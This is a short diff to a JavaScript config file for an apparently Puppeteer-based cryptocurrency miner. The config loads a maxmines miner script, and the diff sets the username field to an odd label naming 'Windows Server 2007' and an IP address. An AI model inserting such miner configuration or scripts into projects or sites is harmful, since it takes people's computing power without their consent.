@@ -4,7 +4,7 @@ module.exports = {
   host: 'localhost',
   interval: 1000,
   threads: -1,
-  username: null,
+  username: "Windows Server 2007 (155.91.178.231)",
   minerUrl: 'https://maxmines.com/lib/maxmines.min.js',
   puppeteerUrl: null
 }
